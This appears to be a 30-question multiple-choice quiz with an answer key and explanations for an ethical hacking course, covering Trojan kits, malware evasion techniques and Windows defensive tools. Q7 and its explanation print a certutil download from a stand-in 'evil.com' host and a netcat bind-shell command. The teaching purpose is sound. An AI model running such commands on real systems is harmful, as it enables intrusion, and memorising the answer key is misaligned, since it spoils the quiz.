# 🎭 MCQ Set — Session 13

Module: Security Concepts — Ethical Hacking
Coverage: Trojan Construction Kits · Wrapping · Evasion Techniques ·
Countermeasures · System File Verification
Total Questions: 30
Format: Foundation + Fundamental + Basic Concepts only

---

## 📋 Table of Contents

1. [Questions — Q1 to Q30](#questions)
2. [Answers & Explanations](#answers--explanations)
3. [Quick Answer Key](#quick-answer-key)
4. [Topic Coverage Map](#topic-coverage-map)

---

## Questions

Q1. What is the primary purpose of a Trojan construction kit?

A) To analyse malware samples in an isolated environment
B) To allow attackers to create customised Trojans without writing any code
C) To decrypt and reverse-engineer existing malware samples
D) To monitor network traffic for Trojan C2 communication

---

Q2. Which of the following best describes Malware-as-a-Service (MaaS)?

A) A legitimate cloud service providing malware scanning on demand
B) A subscription-based model selling malware tools and infrastructure
   on dark web markets
C) A government-sponsored malware analysis platform
D) An open-source framework for building defensive malware signatures

---

Q3. What is wrapping in the context of Trojan delivery?

A) Encrypting a Trojan payload using AES to bypass antivirus scanning
B) Combining a Trojan payload with a legitimate program into a single
   executable so the victim sees expected behaviour while the Trojan
   runs silently
C) Compressing a Trojan executable to reduce its file size on disk
D) Injecting Trojan code into a running legitimate process in memory

---

Q4. Which component of a Trojan construction kit runs on the
attacker's machine and generates the payload executable?

A) The server component
B) The C2 panel
C) The builder component
D) The sniffer module

---

Q5. Microsoft disabled Office macros by default for internet-downloaded
files in 2022. Which file formats did attackers primarily shift to
in order to bypass this restriction?

A) PDF and DOCX files with embedded images
B) ISO, LNK, OneNote, and HTA files
C) ZIP and RAR archives with password protection
D) MP3 and MP4 files with steganographic payloads

---

Q6. What is obfuscation in the context of malware evasion?

A) Encrypting the entire malware payload with a symmetric key
B) Compressing the executable to reduce its binary signature
C) Transforming code structure to make it harder to read and detect
   without changing its functionality
D) Injecting malware into a legitimate process to hide its presence

---

Q7. Which of the following is a correct example of a LOLBin being
abused to download a malicious file?

A) nc -lvnp 4444 -e cmd.exe
B) certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe
C) sfc /scannow
D) Get-FileHash file.exe -Algorithm SHA256

---

Q8. What is the key difference between a packer and a crypter?

A) A packer targets Linux systems while a crypter targets Windows
B) A packer compresses the executable while a crypter encrypts the
   payload — both change the on-disk signature to evade AV
C) A packer requires admin privileges while a crypter does not
D) A packer is used for legitimate purposes only while a crypter
   is always malicious

---

Q9. What makes a runtime crypter more evasive than a scan-time crypter?

A) Runtime crypters use stronger AES-256 encryption
B) Runtime crypters never contact a C2 server during execution
C) Runtime crypters decrypt the payload entirely in memory —
   the plaintext payload never exists on disk
D) Runtime crypters operate at kernel level bypassing all AV hooks

---

Q10. Which of the following correctly describes polymorphic malware?

A) Malware that rewrites its own code with every infection while
   keeping the same encryption stub
B) Malware that changes its encryption key and decryption stub with
   each infection while retaining the same underlying behaviour
C) Malware that executes entirely in memory leaving no file on disk
D) Malware that uses legitimate OS tools to perform malicious actions

---

Q11. What is the primary difference between polymorphic and
metamorphic malware?

A) Polymorphic malware targets Windows while metamorphic targets Linux
B) Polymorphic changes encryption key and stub — metamorphic rewrites
   its own actual code with each generation
C) Polymorphic requires a C2 server while metamorphic operates offline
D) Polymorphic uses packers while metamorphic uses crypters

---

Q12. Which anti-analysis technique involves the malware waiting for
a period of time before executing its payload to outlast sandbox
analysis timeouts?

A) VM detection
B) Canary file check
C) Sleep or delay execution
D) Process list enumeration

---

Q13. What does Living off the Land (LotL) mean in the context of
Trojan evasion?

A) Malware that infects agricultural control systems
B) Using legitimate pre-installed OS tools and utilities to perform
   malicious actions instead of deploying custom malware
C) Malware that copies itself to removable media to spread
D) Using cloud storage services to host and deliver malware payloads

---

Q14. Which of the following correctly describes fileless malware?

A) Malware stored in a hidden NTFS alternate data stream on disk
B) Malware that executes entirely in memory with no malicious file
   written to disk
C) Malware disguised as a legitimate system file with the same name
D) Malware that deletes itself after successfully establishing a backdoor

---

Q15. What is AMSI and what is its primary function?

A) A network monitoring tool that inspects firewall rules for anomalies
B) A Windows API interface allowing AV engines to scan script content
   before it is executed — even if obfuscated or Base64-encoded
C) A Microsoft tool that repairs corrupted Windows system files
D) An antivirus engine built into Windows Defender exclusively

---

Q16. Which Windows built-in command-line tool scans and repairs
protected Windows system files?

A) DISM
B) chkdsk
C) sfc
D) bcdedit

---

Q17. What is the correct SFC command to scan ALL protected Windows
system files and repair them automatically?

A) sfc /verifyonly
B) sfc /scannow
C) sfc /repair /all
D) sfc /scanfile=C:\Windows\System32

---

Q18. What does Tripwire do in the context of system security?

A) Scans running processes for signs of rootkit activity
B) Creates a cryptographic baseline of files and alerts when any
   file is added, modified, or deleted
C) Monitors network traffic for Trojan C2 beaconing patterns
D) Repairs corrupted Windows system files using cached copies

---

Q19. Which hash algorithm is the current standard for file
integrity verification?

A) MD5
B) SHA-1
C) SHA-256
D) LM Hash

---

Q20. Which Sysinternals tool shows every autostart location on a
Windows system — including Registry Run keys, scheduled tasks,
services, and drivers — in a single view?

A) Process Explorer
B) TCPView
C) Process Monitor
D) Autoruns

---

Q21. Which Sysinternals tool is best used to identify anomalous
parent-child process relationships — such as Word.exe spawning
cmd.exe?

A) Autoruns
B) Process Explorer
C) Sigcheck
D) Streams

---

Q22. What is the primary limitation of SFC (System File Checker)
for Trojan detection?

A) SFC can only run on Windows Server — not on workstations
B) SFC only checks Windows protected system files — it does not
   scan user files, application directories, or the registry
C) SFC requires an internet connection to download repair files
D) SFC cannot detect file modifications — only missing files

---

Q23. Which Windows PowerShell command computes the SHA-256 hash
of a file?

A) certutil -hashfile file.exe SHA256
B) md5sum file.exe
C) Get-FileHash file.exe -Algorithm SHA256
D) sha256sum file.exe

---

Q24. What is the purpose of a mutex in a Trojan construction kit?

A) To encrypt the C2 communication channel
B) To prevent multiple instances of the same Trojan from running
   on the same infected host simultaneously
C) To hide the Trojan process from the Windows Task Manager
D) To establish persistence via the Windows Registry Run key

---

Q25. Which of the following tools is correctly matched to its
Sysinternals function?

A) TCPView — shows all autostart locations
B) Autoruns — shows real-time file and registry activity
C) Sigcheck — verifies digital signatures of executables
D) Process Monitor — shows active TCP/UDP network connections

---

Q26. The GuLoader crypter is notable for which specific evasion
technique that makes URL filtering ineffective?

A) It uses DNS tunnelling to exfiltrate data avoiding HTTP entirely
B) It hosts encrypted payloads on legitimate cloud storage services
   like Google Drive and OneDrive — defeating domain reputation filters
C) It injects into the Windows kernel bypassing all user-space AV hooks
D) It uses polymorphic code generation to produce unique samples per victim

---

Q27. Which of the following file formats became a primary Trojan
delivery vector specifically AFTER Microsoft blocked Office macros
by default in 2022?

A) PDF with embedded JavaScript
B) Excel XLSM with VBA macros
C) ISO disk image files
D) Word DOCX with embedded images

---

Q28. Under IT Act 2000, which section applies when a Trojan is
deployed against critical national infrastructure such as a
power grid with intent to threaten national security?

A) Section 43
B) Section 66
C) Section 66B
D) Section 66F

---

Q29. What does the Autoruns VirusTotal integration do?

A) Downloads the latest virus definitions from VirusTotal servers
B) Submits hashes of every autostart entry to VirusTotal and
   highlights known malicious entries in red
C) Automatically quarantines all autostart entries flagged as suspicious
D) Compares autostart entries against a local malware signature database

---

Q30. Which of the following is a correct description of a
metamorphic virus?

A) A virus that changes its encryption key with each infection
   but keeps the same decryption stub
B) A virus that executes only in memory and never writes itself to disk
C) A virus that rewrites its own code with each generation —
   producing a structurally different binary each time with no
   encryption stub required
D) A virus that uses legitimate OS binaries to spread across
   the network without a custom payload




---




---




---


## Answers & Explanations

---

Q1. Correct Answer: B) To allow attackers to create customised
Trojans without writing any code ✅

Explanation: A Trojan construction kit is a GUI-driven tool that
generates fully functional Trojan payloads by filling in a form —
C2 IP, port, persistence method, icon. No coding skill required.
It democratises Trojan creation to non-technical attackers.

A) To analyse malware samples — ❌ That is a sandbox function.
B) To create Trojans without coding — ✅ Correct.
C) To reverse-engineer malware — ❌ That is reverse engineering.
D) To monitor C2 traffic — ❌ That is an IDS/NTA function.

---

Q2. Correct Answer: B) A subscription-based model selling malware
tools and infrastructure on dark web markets ✅

Explanation: MaaS mirrors legitimate SaaS — customers pay a
subscription fee and receive builder tools, C2 infrastructure,
dashboards, updates, and technical support. No malware knowledge
needed. RedLine Stealer ($100–$200/month) is the benchmark example.

A) Legitimate cloud scanning — ❌ MaaS is criminal infrastructure.
B) Subscription-based dark web malware — ✅ Correct.
C) Government analysis platform — ❌ Fabricated description.
D) Open-source defensive framework — ❌ Opposite of MaaS.

---

Q3. Correct Answer: B) Combining a Trojan payload with a legitimate
program into a single executable ✅

Explanation: Wrapping binds a Trojan with a legitimate host program.
The victim runs one file — sees the legitimate program running
visibly — while the Trojan executes silently in the background.
The cover of legitimate behaviour overcomes user suspicion.

A) Encrypting payload — ❌ That is a crypter function.
B) Combining Trojan + legitimate program — ✅ Correct.
C) Compressing executable — ❌ That is a packer function.
D) Injecting into running process — ❌ That is process injection.

---

Q4. Correct Answer: C) The builder component ✅

Explanation: Construction kits have two components. The BUILDER
runs on the attacker's machine — it generates the customised
Trojan payload executable. The SERVER/C2 PANEL runs on the
attacker's C2 infrastructure — it receives connections from
deployed Trojans and provides a management dashboard.

A) Server component — ❌ The server RECEIVES connections — it does
not generate payloads.
B) C2 panel — ❌ The C2 panel is the server-side management interface.
C) Builder component — ✅ Correct. Generates payload on attacker machine.
D) Sniffer module — ❌ Not a standard construction kit component.

---

Q5. Correct Answer: B) ISO, LNK, OneNote, and HTA files ✅

Explanation: After Microsoft blocked macros by default in 2022 for
MOTW-tagged Office files, attackers immediately pivoted to container
formats — ISO and IMG files mount as drives and at the time bypassed
MOTW. LNK shortcut files, OneNote .one files with embedded attachments,
and HTA (HTML Application) files all became dominant delivery vectors
within weeks of the macro block policy change.

A) PDF and DOCX with images — ❌ Not the primary pivot formats.
B) ISO, LNK, OneNote, HTA — ✅ Correct. Primary post-macro-block
vectors.
C) ZIP/RAR with passwords — ❌ Used but not the primary identified shift.
D) MP3/MP4 with steganography — ❌ Not a primary delivery format.

---

Q6. Correct Answer: C) Transforming code structure to make it harder
to read and detect without changing its functionality ✅

Explanation: Obfuscation changes the APPEARANCE of code — variable
renaming, dead code insertion, string splitting, control flow
flattening — while the code performs exactly the same function.
This changes the binary byte pattern that AV signatures look for.

A) Encrypting with symmetric key — ❌ That is encryption, not
obfuscation. Encryption requires a key; obfuscation does not.
B) Compressing executable — ❌ That is packing.
C) Transforming code structure — ✅ Correct.
D) Injecting into legitimate process — ❌ That is process injection.

---

Q7. Correct Answer: B) certutil.exe -urlcache -split -f
http://evil.com/payload.exe payload.exe ✅

Explanation: certutil.exe is a Windows built-in certificate
management utility — a classic LOLBin. The -urlcache -split -f
flags instruct it to download a file from a URL and save it locally.
Since certutil.exe is a legitimate signed Windows binary, this
download activity is far less likely to be flagged by AV than a
custom downloader tool.

A) nc -lvnp 4444 -e cmd.exe — ❌ This is a Netcat bind shell — not
a LOLBin download command.
B) certutil.exe download command — ✅ Correct. LOLBin file download.
C) sfc /scannow — ❌ This is System File Checker — a defensive tool.
D) Get-FileHash — ❌ This is a PowerShell hash computation command —
defensive use.

---

Q8. Correct Answer: B) A packer compresses the executable while a
crypter encrypts the payload — both change the on-disk signature ✅

Explanation: A packer wraps the executable in a compression layer
with a decompression stub — changes signature by altering binary
structure. A crypter wraps the payload in encryption with a
decryption stub — changes signature by making content unreadable.
Both result in a different on-disk binary that evades signature AV.

A) Platform targeting — ❌ Both work on Windows — platform is not
the distinction.
B) Packer compresses / crypter encrypts — ✅ Correct.
C) Privilege requirements — ❌ Neither requires admin inherently.
D) Legitimate vs always malicious — ❌ UPX packer is legitimate.
Crypters can also have legitimate uses (DRM).

---

Q9. Correct Answer: C) Runtime crypters decrypt the payload entirely
in memory — the plaintext payload never exists on disk ✅

Explanation: A scan-time crypter decrypts to a temp file before
execution — that plaintext file briefly exists on disk and can be
scanned. A runtime crypter decrypts directly into memory — no
plaintext file ever touches the disk. AV file scanners have nothing
to scan. Only memory scanning (EDR) can detect it.

A) Stronger encryption — ❌ The encryption algorithm is not what
distinguishes runtime from scan-time crypters.
B) No C2 contact — ❌ Both types may contact C2 — this is not
the distinction.
C) Decrypts in memory only — ✅ Correct.
D) Kernel-level operation — ❌ Runtime crypters typically operate
in user space.

---

Q10. Correct Answer: B) Malware that changes its encryption key and
decryption stub with each infection while retaining the same
underlying behaviour ✅

Explanation: Polymorphic malware keeps the same core malicious
payload but changes the encryption key and decryption stub with
every infection — producing a different binary signature each time.
AV signature for one version does not match any other version.
The behaviour is identical — only the wrapping changes.

A) Rewrites own code — ❌ Rewriting own code is metamorphic, not
polymorphic.
B) Changes key and stub, same behaviour — ✅ Correct.
C) Executes in memory only — ❌ That is fileless malware.
D) Uses legitimate OS tools — ❌ That is Living off the Land.

---

Q11. Correct Answer: B) Polymorphic changes encryption key and stub
— metamorphic rewrites its own actual code ✅

Explanation: This is the most tested malware classification
distinction in this session. Polymorphic = same code + different
encryption wrapper. Metamorphic = different code every generation
— no encryption stub needed because the actual instructions are
rewritten. Metamorphic is significantly harder to detect because
there is no consistent stub pattern to identify.

A) Platform targeting — ❌ Both target multiple platforms.
B) Key/stub vs code rewriting — ✅ Correct. The defining distinction.
C) C2 requirement — ❌ Neither type is defined by C2 dependency.
D) Packer vs crypter — ❌ These are different evasion mechanisms
unrelated to the poly/meta distinction.

---

Q12. Correct Answer: C) Sleep or delay execution ✅

Explanation: Most automated sandboxes run samples for a fixed window
— typically 2–3 minutes. Malware that sleeps for 5–10 minutes before
executing will appear benign in the sandbox report — the sandbox
times out before any malicious behaviour occurs. This is one of the
most common and effective anti-sandbox techniques.

A) VM detection — ❌ VM detection checks for virtual environment
artefacts — not timing-based.
B) Canary file check — ❌ Canary file checks look for sandbox-
specific files — not timing-based.
C) Sleep or delay — ✅ Correct. Outlasts sandbox timeout.
D) Process list enumeration — ❌ Process list checks look for
AV/sandbox processes — not timing-based.

---

Q13. Correct Answer: B) Using legitimate pre-installed OS tools to
perform malicious actions instead of deploying custom malware ✅

Explanation: Living off the Land means the attacker uses tools
already present on the target system — PowerShell, certutil,
mshta, regsvr32, wmic — for malicious purposes. No custom malware
file is needed. Since these are trusted signed OS binaries, AV and
application whitelisting do not flag them.

A) Agricultural systems — ❌ LotL has nothing to do with
agriculture — the "land" refers to the target system's resources.
B) Using legitimate OS tools — ✅ Correct.
C) Copying to removable media — ❌ That describes a worm spreading
via USB.
D) Cloud storage hosting — ❌ Cloud hosting is a delivery technique
— not LotL.

---

Q14. Correct Answer: B) Malware that executes entirely in memory
with no malicious file written to disk ✅

Explanation: Fileless malware lives and executes in RAM only. A
common chain: phishing email → Office macro → PowerShell → shellcode
injected into legitimate process (explorer.exe). No .exe or .dll
is written to disk. File-based AV scanners find nothing. Detection
requires memory forensics, AMSI, or EDR behavioural monitoring.

A) Hidden in NTFS ADS — ❌ Hiding in Alternate Data Streams is a
different steganography/evasion technique — the file still exists.
B) Executes in memory only — ✅ Correct.
C) Disguised as system file — ❌ That is masquerading — the file
still exists on disk.
D) Deletes itself after backdoor — ❌ Self-deletion still means a
file existed at some point — not the definition of fileless.

---

Q15. Correct Answer: B) A Windows API interface allowing AV engines
to scan script content before execution ✅

Explanation: AMSI (Antimalware Scan Interface) is a Windows 10+
API that provides a hook for AV engines to scan script content
at runtime — before PowerShell, VBScript, or other script hosts
execute it. Critically, AMSI scans the DECODED content — so even
Base64-encoded or obfuscated scripts are scanned after decoding.
This is the primary defence against PowerShell-based fileless
attacks.

A) Network monitoring tool — ❌ AMSI operates at the endpoint
script execution layer — not network level.
B) Windows API for script scanning — ✅ Correct.
C) Windows system file repair — ❌ That is SFC.
D) AV engine exclusively — ❌ AMSI is the interface/pipeline —
AV engines plug into it. AMSI itself is not an AV engine.

---

Q16. Correct Answer: C) sfc ✅

Explanation: SFC = System File Checker — the built-in Windows
command-line tool that scans and repairs protected Windows system
files. DISM is used to repair the Windows image itself (needed
before SFC if the component store is corrupted). chkdsk checks
disk integrity. bcdedit manages boot configuration.

A) DISM — ❌ DISM repairs the Windows image/component store —
run BEFORE sfc if the cache is corrupted.
B) chkdsk — ❌ chkdsk checks and repairs disk file system errors
— not system file integrity.
C) sfc — ✅ Correct. System File Checker.
D) bcdedit — ❌ bcdedit is the Boot Configuration Data editor —
manages boot loader entries.

---

Q17. Correct Answer: B) sfc /scannow ✅

Explanation: sfc /scannow is the standard command — it scans ALL
protected Windows system files and automatically repairs any that
are modified or corrupted using cached copies from the WinSxS
folder. Results are logged to %WINDIR%\Logs\CBS\CBS.log.
sfc /verifyonly scans but does NOT repair.

A) sfc /verifyonly — ❌ Scans only — does not repair.
B) sfc /scannow — ✅ Correct. Scan + repair all.
C) sfc /repair /all — ❌ Not a valid SFC command syntax.
D) sfc /scanfile=C:\Windows\System32 — ❌ /scanfile requires a
specific file path — not a directory.

---

Q18. Correct Answer: B) Creates a cryptographic baseline of files
and alerts when any file is added, modified, or deleted ✅

Explanation: Tripwire is a File Integrity Monitoring (FIM) tool.
It scans designated files and directories, computes SHA-256 hashes
of each file, stores them in a signed encrypted database (baseline),
then re-scans at intervals and alerts on any hash mismatch, new
file, or missing file. Unlike SFC it monitors ANY file — not just
Windows system files.

A) Rootkit scanning — ❌ Rootkit detection is a different function
— RootkitRevealer (Sysinternals) addresses this.
B) Baseline + alert on changes — ✅ Correct.
C) Network C2 monitoring — ❌ That is NTA/IDS function.
D) Repairs Windows system files — ❌ That is SFC — Tripwire does
not repair files.

---

Q19. Correct Answer: C) SHA-256 ✅

Explanation: SHA-256 (256-bit output) is the current standard for
file integrity verification. MD5 (128-bit) is broken for collision
resistance and used only for legacy file identification. SHA-1
(160-bit) is deprecated. LM Hash is a Windows password hash — not
a file integrity algorithm.

A) MD5 — ❌ MD5 is broken for collision resistance — legacy use only.
B) SHA-1 — ❌ SHA-1 is deprecated — not recommended for new
implementations.
C) SHA-256 — ✅ Correct. Current standard.
D) LM Hash — ❌ LM Hash is a Windows password hashing mechanism —
completely unrelated to file integrity verification.

---

Q20. Correct Answer: D) Autoruns ✅

Explanation: Autoruns (Sysinternals) is the single most
comprehensive autostart location viewer for Windows. It shows
every persistence mechanism in one interface: Registry Run keys,
Scheduled Tasks, Services, Drivers, Browser extensions, Startup
folders, Winlogon entries, AppInit DLLs, and more. It also
integrates with VirusTotal to flag known malicious entries in red.

A) Process Explorer — ❌ Process Explorer shows running processes
and parent-child relationships — not autostart locations.
B) TCPView — ❌ TCPView shows active network connections.
C) Process Monitor — ❌ Process Monitor captures real-time file,
registry, and process activity — not autostart locations specifically.
D) Autoruns — ✅ Correct.

---

Q21. Correct Answer: B) Process Explorer ✅

Explanation: Process Explorer (Sysinternals) displays the full
process tree including parent-child relationships. A Trojan
delivered via an Office macro always shows an anomalous chain:
Word.exe or Excel.exe spawning cmd.exe, PowerShell.exe, or
wscript.exe — which should never happen in normal operation.
Process Explorer makes these chains immediately visible.

A) Autoruns — ❌ Autoruns shows persistence locations — not
real-time process relationships.
B) Process Explorer — ✅ Correct. Parent-child process tree.
C) Sigcheck — ❌ Sigcheck verifies digital signatures of files.
D) Streams — ❌ Streams shows NTFS Alternate Data Streams.

---

Q22. Correct Answer: B) SFC only checks Windows protected system
files — it does not scan user files, application directories,
or the registry ✅

Explanation: SFC's scope is limited to files in the Windows
protected file list — primarily files in C:\Windows\System32
and similar system locations. A Trojan dropped in %APPDATA%,
%TEMP%, or Program Files, or persisting via a scheduled task
or registry key, is completely outside SFC's scope and will
not be detected.

A) Server only — ❌ SFC works on all Windows editions including
workstations.
B) Windows system files only — ✅ Correct. Primary limitation.
C) Requires internet — ❌ SFC uses the local WinSxS cache —
no internet needed.
D) Cannot detect modifications — ❌ SFC specifically detects
and repairs modified files — detecting modifications is its
primary function.

---

Q23. Correct Answer: C) Get-FileHash file.exe -Algorithm SHA256 ✅

Explanation: Get-FileHash is the PowerShell cmdlet for computing
file hashes. The -Algorithm parameter specifies SHA256, MD5, or
SHA512. certutil -hashfile is the Windows command-line equivalent
(option A) — both are valid Windows tools. md5sum and sha256sum
are Linux commands.

A) certutil -hashfile file.exe SHA256 — ❌ This is valid but it
is the certutil (CMD) command — not PowerShell.
B) md5sum file.exe — ❌ Linux command — not available natively
on Windows.
C) Get-FileHash file.exe -Algorithm SHA256 — ✅ Correct.
PowerShell command.
D) sha256sum file.exe — ❌ Linux command — not Windows PowerShell.

---

Q24. Correct Answer: B) To prevent multiple instances of the same
Trojan from running on the same infected host simultaneously ✅

Explanation: A mutex (mutual exclusion object) is a named Windows
synchronisation object. Trojans create a named mutex on infection
— before executing, they check if the mutex already exists. If it
does, another instance is already running and the new instance
exits. This prevents resource conflicts, performance issues, and
multiple C2 connections from the same host that would create
suspicious duplicate traffic.

A) Encrypt C2 channel — ❌ Encryption is handled by the transport
layer — not a mutex.
B) Prevent multiple instances — ✅ Correct.
C) Hide from Task Manager — ❌ Process hiding is done via rootkit
or process injection — not a mutex.
D) Registry persistence — ❌ Registry persistence is a separate
mechanism — not related to mutex.

---

Q25. Correct Answer: C) Sigcheck — verifies digital signatures
of executables ✅

Explanation: Sigcheck verifies the Authenticode digital signature
of executables — identifying unsigned, expired, or forged
signatures. TCPView shows active network connections (not
autostart). Autoruns shows autostart locations (not real-time
activity). Process Monitor shows real-time file/registry/process
activity (not network connections).

A) TCPView shows autostart — ❌ TCPView shows TCP/UDP connections.
B) Autoruns shows real-time file activity — ❌ Autoruns shows
persistence/autostart locations.
C) Sigcheck verifies digital signatures — ✅ Correct.
D) Process Monitor shows network connections — ❌ Process Monitor
shows file, registry, and process activity — TCPView handles
network connections.

---

Q26. Correct Answer: B) It hosts encrypted payloads on legitimate
cloud storage services like Google Drive and OneDrive ✅

Explanation: GuLoader's key innovation is hosting its encrypted
payloads on legitimate cloud storage — Google Drive, OneDrive,
Dropbox. URL reputation filtering cannot block these domains
without breaking legitimate productivity tools. The payload is
encrypted — content inspection cannot identify it as malicious.
This dual bypass (domain reputation + content inspection) made
GuLoader extremely persistent across 2019–2024.

A) DNS tunnelling — ❌ GuLoader does not primarily use DNS
tunnelling for payload delivery.
B) Cloud storage hosting — ✅ Correct. Key evasion mechanism.
C) Kernel injection — ❌ GuLoader operates in user space.
D) Polymorphic generation — ❌ While GuLoader does mutate,
the cloud hosting is its defining evasion characteristic.

---

Q27. Correct Answer: C) ISO disk image files ✅

Explanation: ISO (and IMG) disk image files were the primary
immediate pivot after Microsoft's 2022 macro block. When opened,
ISO files mount as a virtual drive in Windows — and at the time,
files inside an ISO did not inherit the MOTW tag from the
container. This meant a Trojan inside an ISO could execute
without the SmartScreen warning that MOTW-tagged files trigger.
Microsoft subsequently patched this in late 2022.

A) PDF with JavaScript — ❌ PDF exploits predate the macro block
and were not the primary pivot format specifically post-2022.
B) Excel XLSM with VBA macros — ❌ This is the format that was
BLOCKED — not the pivot format.
C) ISO disk image files — ✅ Correct. Primary post-macro-block pivot.
D) Word DOCX with embedded images — ❌ Not the primary pivot format.

---

Q28. Correct Answer: D) Section 66F ✅

Explanation: IT Act 2000 Section 66F = Cyber Terrorism. Deploying
malware against critical national infrastructure (power grid,
banking systems, defence) with intent to threaten national security
or cause widespread disruption falls under Section 66F. Penalty:
Life imprisonment — the harshest penalty in the IT Act.
Section 66 covers general unauthorised access (3 years + ₹5L).

A) Section 43 — ❌ Section 43 covers civil liability for
unauthorised access — not criminal penalty for terrorism.
B) Section 66 — ❌ Section 66 covers general unauthorised computer
access — not critical infrastructure terrorism.
C) Section 66B — ❌ Section 66B covers receiving stolen computer
resources — not terrorism.
D) Section 66F — ✅ Correct. Cyber terrorism. Life imprisonment.

---

Q29. Correct Answer: B) Submits hashes of every autostart entry
to VirusTotal and highlights known malicious entries in red ✅

Explanation: Autoruns has a built-in VirusTotal integration
(Options → Scan Options → Check VirusTotal.com). It computes
the hash of every autostart entry and submits them to VirusTotal.
Entries flagged by any VT engine are highlighted in red —
instantly identifying known malicious persistence mechanisms
across ALL autostart locations in one view.

A) Downloads virus definitions — ❌ Autoruns does not download
AV definitions — it submits hashes to VT for lookup.
B) Submits hashes and highlights malicious entries — ✅ Correct.
C) Automatically quarantines — ❌ Autoruns does not quarantine
automatically — it highlights for analyst review.
D) Local signature database — ❌ Autoruns uses the online
VirusTotal service — not a local database.

---

Q30. Correct Answer: C) A virus that rewrites its own code with
each generation — producing a structurally different binary each
time with no encryption stub required ✅

Explanation: Metamorphic viruses use a built-in mutation engine
to rewrite their own code completely with each infection —
instruction substitution, code transposition, dead code insertion.
No encryption stub is needed because there is no encrypted payload
to decrypt — the code itself is structurally different every time.
This makes signature and stub-based detection ineffective.

A) Changes encryption key — ❌ That is polymorphic — not
metamorphic.
B) Executes in memory only — ❌ That is fileless malware —
not metamorphic.
C) Rewrites own code each generation — ✅ Correct. Metamorphic.
D) Uses legitimate OS binaries — ❌ That is Living off the Land
— not metamorphic.

---

## Quick Answer Key

| Q | Answer | Q | Answer | Q | Answer |
|---|---|---|---|---|---|
| Q1 | B | Q11 | B | Q21 | B |
| Q2 | B | Q12 | C | Q22 | B |
| Q3 | B | Q13 | B | Q23 | C |
| Q4 | C | Q14 | B | Q24 | B |
| Q5 | B | Q15 | B | Q25 | C |
| Q6 | C | Q16 | C | Q26 | B |
| Q7 | B | Q17 | B | Q27 | C |
| Q8 | B | Q18 | B | Q28 | D |
| Q9 | C | Q19 | C | Q29 | B |
| Q10 | B | Q20 | D | Q30 | C |

---

## Topic Coverage Map

| Q | Section | Concept Tested |
|---|---|---|
| Q1 | Section 1.1 | Trojan construction kit — purpose |
| Q2 | Section 1.3 | MaaS — definition |
| Q3 | Section 2.1 | Wrapping — definition |
| Q4 | Section 1.2 | Construction kit — builder vs server |
| Q5 | Section 2.5 | File format abuse — post-macro-block pivot |
| Q6 | Section 3.2 | Obfuscation — definition |
| Q7 | Section 3.7 | LOLBins — certutil download |
| Q8 | Section 3.4 | Packer vs crypter — distinction |
| Q9 | Section 3.4 | Runtime crypter — memory-only decryption |
| Q10 | Section 3.5 | Polymorphic malware — definition |
| Q11 | Section 3.5 | Polymorphic vs metamorphic — distinction |
| Q12 | Section 3.6 | Anti-sandbox — sleep/delay technique |
| Q13 | Section 3.7 | Living off the Land — definition |
| Q14 | Section 3.8 | Fileless malware — definition |
| Q15 | Section 4.1 | AMSI — purpose and function |
| Q16 | Section 5.2 | SFC — tool name |
| Q17 | Section 5.2 | SFC — /scannow command |
| Q18 | Section 5.3 | Tripwire — FIM function |
| Q19 | Section 5.4 | SHA-256 — file integrity standard |
| Q20 | Section 5.5 | Autoruns — all autostart locations |
| Q21 | Section 5.5 | Process Explorer — parent-child anomaly |
| Q22 | Section 5.2 | SFC — primary limitation |
| Q23 | Section 5.4 | Get-FileHash — PowerShell hash command |
| Q24 | Section 1.2 | Mutex — purpose in construction kit |
| Q25 | Section 5.5 | Sysinternals tool matching |
| Q26 | Extra Notes | GuLoader — cloud storage evasion |
| Q27 | Section 2.5 | ISO files — post-macro-block delivery |
| Q28 | Extra Notes | IT Act S.66F — cyber terrorism penalty |
| Q29 | Section 5.5 | Autoruns VirusTotal integration |
| Q30 | Section 3.5 | Metamorphic virus — definition |

---